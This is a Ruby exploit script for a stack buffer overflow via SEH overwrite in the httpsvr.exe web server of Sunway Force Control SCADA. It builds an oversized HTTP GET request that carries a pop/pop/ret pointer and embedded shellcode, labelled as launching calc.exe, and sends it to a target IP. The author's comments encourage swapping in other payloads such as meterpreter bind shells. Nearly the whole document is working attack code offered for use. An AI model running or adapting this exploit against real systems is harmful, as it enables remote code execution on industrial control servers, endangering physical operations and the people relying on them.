# Sunway Force Control SCADA httpsvr.exe Exploit
# Exploitable with simple SEH Overwrite technique
# Tested on XP SP0 English
# Probably will work on XP SP3 if you find none-safeseh dll for p/p/r pointer
# Canberk BOLAT | @cnbrkbolat
# cbolat.blogspot.com 
# for fun ;)
#
# notez: other payloads not working stable because of memory region's status.
# i tested meterpreter/bind_tcp and others some of them not work because of
# trying to write to unwritable memory regions.
# if you write some asm for changing access protection of memory region
# it can be work. try it, do it!
#
# Vendor: http://www.sunwayland.com.cn/

def send(packet)
	begin
		sock = TCPSocket.new(@ip, @port)
		sock.write(packet)
	rescue Exception => e
		return false
	else
		resp = sock.recv(1024) 
		sock.close
		
		return true
	end
end

@ip = ARGV[0]
@port = 80

# windows/exec CMD=calc.exe
shellcode = "\xb8\xd5\x45\x06\xc4\xda\xde\xd9\x74\x24\xf4\x5b\x33\xc9" +
			"\xb1\x33\x31\x43\x12\x03\x43\x12\x83\x3e\xb9\xe4\x31\x3c" +
			"\xaa\x60\xb9\xbc\x2b\x13\x33\x59\x1a\x01\x27\x2a\x0f\x95" +
			"\x23\x7e\xbc\x5e\x61\x6a\x37\x12\xae\x9d\xf0\x99\x88\x90" +
			"\x01\x2c\x15\x7e\xc1\x2e\xe9\x7c\x16\x91\xd0\x4f\x6b\xd0" +
			"\x15\xad\x84\x80\xce\xba\x37\x35\x7a\xfe\x8b\x34\xac\x75" +
			"\xb3\x4e\xc9\x49\x40\xe5\xd0\x99\xf9\x72\x9a\x01\x71\xdc" +
			"\x3b\x30\x56\x3e\x07\x7b\xd3\xf5\xf3\x7a\x35\xc4\xfc\x4d" +
			"\x79\x8b\xc2\x62\x74\xd5\x03\x44\x67\xa0\x7f\xb7\x1a\xb3" +
			"\xbb\xca\xc0\x36\x5e\x6c\x82\xe1\xba\x8d\x47\x77\x48\x81" +
			"\x2c\xf3\x16\x85\xb3\xd0\x2c\xb1\x38\xd7\xe2\x30\x7a\xfc" +
			"\x26\x19\xd8\x9d\x7f\xc7\x8f\xa2\x60\xaf\x70\x07\xea\x5d" +
			"\x64\x31\xb1\x0b\x7b\xb3\xcf\x72\x7b\xcb\xcf\xd4\x14\xfa" +
			"\x44\xbb\x63\x03\x8f\xf8\x9c\x49\x92\xa8\x34\x14\x46\xe9" +
			"\x58\xa7\xbc\x2d\x65\x24\x35\xcd\x92\x34\x3c\xc8\xdf\xf2" +
			"\xac\xa0\x70\x97\xd2\x17\x70\xb2\xb0\xf6\xe2\x5e\x19\x9d" +
			"\x82\xc5\x65"
			
payload = "H" * 1599
payload << "\xeb\x06\x90\x90" # Pointer to Next SE Handler
payload << [0x719737FA].pack("V*") # SEH Handler - p/p/r
payload << "\x90" * 40
payload << shellcode
payload << "\x90" * (4058 - shellcode.length)

pack = "GET /#{payload} HTTP/1.1\r\n"
pack << "Host: http://#{@ip}:#{@port}\r\n\r\n"

puts "packet sended." if send(pack)